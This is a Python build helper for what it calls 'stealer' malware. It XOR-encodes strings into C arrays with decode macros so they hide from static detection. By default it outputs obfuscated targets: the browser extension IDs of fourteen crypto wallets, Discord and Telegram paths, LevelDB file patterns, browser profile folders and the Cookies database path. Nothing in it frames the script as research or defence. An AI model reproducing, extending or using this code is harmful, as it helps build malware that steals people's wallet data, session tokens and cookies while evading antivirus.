#!/usr/bin/env python3
"""
XOR-encrypt a string with key 0x5A and output C array initializer.
Usage: python xor_str.py "string to encrypt"
"""
import sys

KEY = 0x5A

def xor_encode(s):
    return [b ^ KEY for b in s.encode('utf-8')]

def make_c_array(name, s):
    enc = xor_encode(s)
    hex_str = ','.join(f'0x{b:02x}' for b in enc)
    return f'/* "{s}" */\nstatic const BYTE ENC_{name}[] = {{{hex_str}}};\n#define DEC_{name}(buf) _xd(buf, ENC_{name}, {len(enc)}, 0x5A)\n'

if __name__ == '__main__':
    if len(sys.argv) < 2:
        # Generate all wallet extension IDs
        wallets = [
            ("WALLET_METAMASK", "nkbihfbeogaeaoehlefnkodbefgpgknn"),
            ("WALLET_PHANTOM", "bfnaelmomeimhlpmgjnjophhpkkoljpa"),
            ("WALLET_COINBASE", "hnfanknocfeofbddgcijnmhnfnkdnaad"),
            ("WALLET_TRUST", "egjidjbpglichdcondbcbdnbeeppgdph"),
            ("WALLET_BINANCE", "fhbohimaelbohpjbbldcngcnapndodjp"),
            ("WALLET_RABBY", "acmacodkjbdgmoleebolmdjonilkdbch"),
            ("WALLET_OKX", "mcohilncbfahbmgdjkbpemcciiolgcge"),
            ("WALLET_SOLFLARE", "bhhhlbepdkbapadjdcodbhiefbnbdidos"),
            ("WALLET_KEPLR", "dmkamcknogkgcdfhhbddcghachkejeap"),
            ("WALLET_RONIN", "fnjhmkhhmkbjkkabndcnnogagogbneec"),
            ("WALLET_EXODUS", "aholpfdialjgjfhomihkjbmgjidlcdno"),
            ("WALLET_BRAVE", "odbfpeeihdkbihmopkbjmoonfanlbfcl"),
            ("WALLET_TRONLINK", "ibnejdfjmmkpcnlpebklmnkoeoihofec"),
            ("WALLET_ZERION", "klghhnkeealcohjjanjjdaeeggmfmlpl"),
        ]
        others = [
            ("LOCAL_EXT_SETTINGS", "Local Extension Settings"),
            ("DISCORD_PATH", "discord"),
            ("DISCORD_PTB", "discordptb"),
            ("DISCORD_CANARY", "discordcanary"),
            ("TELEGRAM_PATH", "Telegram Desktop"),
            ("LEVELDB_LDB", "*.ldb"),
            ("LEVELDB_LOG", "*.log"),
            ("PROFILE_1", "Profile 1"),
            ("PROFILE_2", "Profile 2"),
            ("PROFILE_3", "Profile 3"),
            ("PROFILE_4", "Profile 4"),
            ("PROFILE_5", "Profile 5"),
            ("NETWORK_COOKIES", "Network\\Cookies"),
        ]
        
        print("/* v2.2: Wallet extension IDs (XOR 0x5A) */")
        for name, val in wallets:
            print(make_c_array(name, val))
        
        print("/* v2.2: Other stealer strings */")
        for name, val in others:
            print(make_c_array(name, val))
    else:
        s = sys.argv[1]
        enc = xor_encode(s)
        print(f'/* "{s}" */')
        print(f'static const BYTE ENC_X[] = {{{",".join(f"0x{b:02x}" for b in enc)}}};')
        print(f'#define DEC_X(buf) _xd(buf, ENC_X, {len(enc)}, 0x5A)')
